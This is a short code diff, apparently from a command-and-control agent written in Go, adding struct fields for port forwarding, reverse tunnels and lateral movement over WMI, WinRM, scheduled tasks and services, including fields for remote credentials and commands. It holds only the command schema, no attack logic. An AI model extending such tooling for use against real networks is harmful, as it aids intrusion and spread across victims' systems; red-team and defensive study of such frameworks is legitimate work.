@@ -119,6 +119,17 @@ type Command struct {
 
 	// Phase 11 — SOCKS5 proxy pivot (operation_type: socks5_start | socks5_stop | socks5_status)
 	Socks5Addr string `json:"socks5_addr,omitempty"` // bind address e.g. "127.0.0.1:1080"
+
+	// Port forwarding / reverse tunnel (operation_type: portfwd_start | portfwd_stop)
+	FwdSessID string `json:"fwd_sess_id,omitempty"` // session ID assigned by server
+	FwdTarget string `json:"fwd_target,omitempty"`  // rhost:rport agent should dial
+
+	// Lateral movement (operation_type: lateral_wmi | lateral_winrm | lateral_schtask | lateral_service)
+	LateralTarget  string `json:"lateral_target,omitempty"`  // remote hostname or IP
+	LateralUser    string `json:"lateral_user,omitempty"`    // username (empty = current token)
+	LateralDomain  string `json:"lateral_domain,omitempty"`  // domain (empty = local)
+	LateralPass    string `json:"lateral_pass,omitempty"`    // password
+	LateralCommand string `json:"lateral_command,omitempty"` // command to run on remote host
 }
 
 // CommandResult represents the result of a command execution
